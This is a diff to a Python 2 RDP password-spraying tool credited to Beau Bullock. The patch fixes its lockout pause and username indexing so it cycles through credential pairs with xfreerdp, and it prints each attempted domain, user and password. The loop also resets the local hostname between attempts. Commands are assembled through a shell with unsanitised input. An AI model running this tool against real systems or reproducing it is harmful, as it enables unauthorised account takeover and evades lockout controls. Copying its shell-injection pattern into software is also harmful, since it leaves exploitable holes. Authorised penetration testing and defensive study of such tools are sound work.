@@ -2,7 +2,7 @@
 
 #Written by Beau Bullock (@dafthack)
 
-import getopt, sys, subprocess
+import getopt, sys, subprocess, time
 
 def help():
 	print """
@@ -80,13 +80,14 @@ print "Password spraying has now started... please sit tight."
 #Now using xFreeRDP to spray accounts
 for i in range(total_passwords):
 	for j in range(total_accounts):
-		if lock_counter == lockcount:
-			print "Pausing for ' + str(locktime) + ' minutes...\n"
+		if lock_counter == int(lockcount):
+			print "Pausing for " + str(locktime) + " minutes...\n"
 			lock_counter = 0
-			time.sleep(locktime*60)
+			time.sleep(float(locktime)*60)
 		else:
+			print "Connecting to " + target + " via RDP using " +  domain + "\\" + usernamesstripped[j] + " / " + passwordsstripped[i]
 			subprocess.call("hostnamectl set-hostname '%s'" % hostnamesstripped[k], shell=True)	
-			proc = subprocess.Popen("xfreerdp /v:'%s' +auth-only /d:%s /u:%s /p:%s /sec:nla /cert-ignore" % (target, domain, usernamesstripped[i], passwordsstripped[i]), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+			proc = subprocess.Popen("xfreerdp /v:'%s' +auth-only /d:%s /u:%s /p:%s /sec:nla /cert-ignore" % (target, domain, usernamesstripped[j], passwordsstripped[i]), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 			output = proc.stderr.read()
 			if logonfailed in output:
 				status = "invalid"
